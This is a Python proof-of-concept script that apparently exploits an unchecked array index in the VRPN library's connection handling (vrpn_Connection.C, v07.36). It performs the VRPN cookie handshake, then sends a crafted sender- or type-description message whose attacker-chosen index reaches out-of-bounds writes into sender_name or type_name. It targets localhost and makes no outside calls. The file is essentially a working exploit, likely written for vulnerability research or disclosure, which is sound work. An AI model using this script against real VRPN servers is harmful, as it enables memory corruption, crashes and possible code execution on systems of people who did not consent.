#!/usr/bin/env python3
"""Minimal VRPN TCP client: cookie exchange then one description message.

SENDER_DESCRIPTION (type -1) drives `sender_name[i]` at
`vrpn_Connection.C:4554`; TYPE_DESCRIPTION (type -2) drives the same
unchecked index into `type_name[i]` at `:4482` (v07.36). No external hosts.
"""
import argparse
import socket
import struct
import time

COOKIE_SIZE = 24  # vrpn_MAGICLEN(16) + vrpn_ALIGN(8)
HEADER_LEN = 24   # 5 int32 fields (20) rounded up to vrpn_ALIGN(8)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--index", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--port", type=int, default=3893)
    ap.add_argument("--hold", type=float, default=2.0)
    ap.add_argument("--name", default="AAAA")
    ap.add_argument("--msgtype", type=lambda x: int(x, 0), default=-1,
                    help="VRPN message type: -1 sender description, -2 type description")
    args = ap.parse_args()

    payload = struct.pack(">i", args.index) + args.name.encode()
    payload_len = len(payload)
    ceil_len = payload_len + (-payload_len % 8)
    # VRPN TCP header is 5 int32 + 4 alignment bytes; senders fill the
    # alignment slot with seqNo. 6 int32 = 24 bytes, payload starts there.
    # Adding a further 4 NUL bytes shifts the index out of p.buffer[0:4],
    # making the server read i == 0 for every index.
    msg = struct.pack(">IIIIII", HEADER_LEN + payload_len, 0, 0, 0,
                      args.msgtype & 0xFFFFFFFF, 0)
    msg += payload + b"\0" * (ceil_len - payload_len)

    with socket.create_connection(("127.0.0.1", args.port), timeout=5) as s:
        cookie = s.recv(COOKIE_SIZE)
        if len(cookie) != COOKIE_SIZE:
            raise SystemExit(f"short cookie: {cookie!r}")
        s.sendall(cookie)
        time.sleep(0.2)
        s.sendall(msg)
        time.sleep(args.hold)
        print(f"cookie={cookie!r}")
        print(f"index={args.index} payload_len={payload_len} msg_len={len(msg)}")


if __name__ == "__main__":
    main()
